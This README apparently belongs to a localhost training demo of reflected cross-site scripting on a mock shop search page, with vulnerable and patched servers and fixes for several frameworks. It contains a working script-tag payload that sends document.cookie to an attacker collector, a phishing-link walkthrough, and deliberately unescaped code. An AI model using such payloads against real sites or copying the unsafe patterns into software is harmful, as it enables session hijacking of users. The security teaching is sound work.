# Reflected XSS — ShopNest Search Page

## Port Reference

| Port | Role | File | npm script |
|------|------|------|------------|
| 3003 | Vulnerable victim | `victim-server.js` | `npm run vulnerable` |
| 3004 | Attacker collector | `attacker-server.js` | `npm run guide` |
| 3008 | Protected victim | `victim-server-protected.js` | `npm run secure` |

---

## Attack Flow

```
Attacker crafts link: /search?q=<script>alert(document.cookie)</script>
        ↓ (tricks victim into clicking)
ShopNest (3003) reflects the raw query parameter into HTML — no escaping
        ↓
Victim's browser parses response, executes injected <script>
        ↓
Session stolen → exfiltrated to attacker server (3004)
```

---

## How to Run

```bash
cd demo-attacked/xss/reflected
npm install
```

Three terminals:

```
npm run vulnerable           # :3003
npm run guide                # :3004
npm run secure               # :3008
```

---

## Attack Walkthrough

1. Open `http://localhost:3003` — note the `shopper_session` cookie in the yellow banner.
2. Open `http://localhost:3004` — attacker dashboard.
3. In the attacker dashboard: type any product name, pick a template, click "Generate Phishing Email".
4. Click "View Your Results →" in the generated email preview.
5. You land on `/search?q=<payload>` on the victim server.
6. The cookie appears on the attacker dashboard within 1–2 seconds.

**Manual URL (Script Tag variant):**

```
http://localhost:3003/search?q=<script>new Image().src='http://localhost:3004/steal?c='+encodeURIComponent(document.cookie)</script>
```

**Note on URL encoding:** When you paste this URL into a browser address bar, the browser encodes `<` as `%3C` and `>` as `%3E`. Express automatically URL-decodes `req.query.q`, returning the original `<script>` tag. This is standard HTTP behavior, not a bypass.

---

## Vulnerable Lines

```js
// ⚠️ Raw query param interpolated into HTML — identical to innerHTML server-side
const q = req.query.q || '';
<title>ShopNest — Search: ${q}</title>
<h2>Search results for: ${q}</h2>

// ⚠️ HttpOnly omitted — reflected XSS can read document.cookie
res.setHeader('Set-Cookie', 'shopper_session=...; Path=/');
```

---

## The Fix

```js
// ✅ HTML-encode before interpolation — <script> becomes literal text
const q = htmlEncode(req.query.q || '');
<title>ShopNest — Search: ${q}</title>

// ✅ HttpOnly=true — JavaScript cannot access shopper_session
res.cookie('shopper_session', '...', { path: '/', httpOnly: true });
```

---

## Why It Works

Reflected XSS delivers the payload through a URL parameter. The server echoes the parameter value directly into the HTML response before the browser parses it. The script is baked into the server's HTTP response bytes — it is not injected by JavaScript after page load.

The attack requires social engineering: the victim must click a crafted link (typically embedded in a phishing email). The payload does not persist — only the victim who clicks the link is affected.

Server-side template interpolation with unencoded user input is identical in effect to `innerHTML` on the client — but worse, because it happens before the browser has any chance to apply client-side defenses. The browser receives what it believes is server-authored HTML and parses it top-to-bottom. When it hits the `<script>` tag, it executes the contents unconditionally.

---

## Edge Cases

- **Context matters:** `htmlEncode` is correct for HTML body and attribute contexts. Values reflected inside a `<script>` block or CSS `url()` need different encoding rules.
- **Double encoding:** Encode once at the output boundary only.
- **URL attribute context:** `href="${q}"` requires URL encoding, not HTML encoding. `javascript:alert(1)` is not neutralised by `htmlEncode`.
- **Browser XSS Auditors:** Chrome's built-in Reflected XSS filter was removed in Chrome 78 (2019). Do not rely on it.

---

## This Demo in Real Frameworks

The root cause is an unencoded request parameter interpolated into server-rendered HTML. Applies to Next.js App Router, Next.js pages router, Angular Universal, Nuxt 3 server components, Express+EJS/Handlebars, Django, Laravel, Rails.

**Next.js — App Router (Server Component):**
```tsx
export default function SearchPage({ searchParams }: { searchParams: { q: string } }) {
  // ⚠️ Same injection, different syntax
  return <h2 dangerouslySetInnerHTML={{ __html: `Results for: ${searchParams.q}` }} />
  // ✅ Safe — React escapes automatically
  return <h2>Results for: {searchParams.q}</h2>
}
```

**Django / Jinja2:**
```html
{# ⚠️ |safe filter disables auto-escaping #}
<h2>Results for: {{ q|safe }}</h2>

{# ✅ Safe — Django auto-escapes by default #}
<h2>Results for: {{ q }}</h2>
```

**Laravel / Blade:**
```blade
{{-- ⚠️ {!! !!} renders raw HTML --}}
<h2>Results for: {!! $q !!}</h2>

{{-- ✅ Safe — {{ }} auto-escapes --}}
<h2>Results for: {{ $q }}</h2>
```
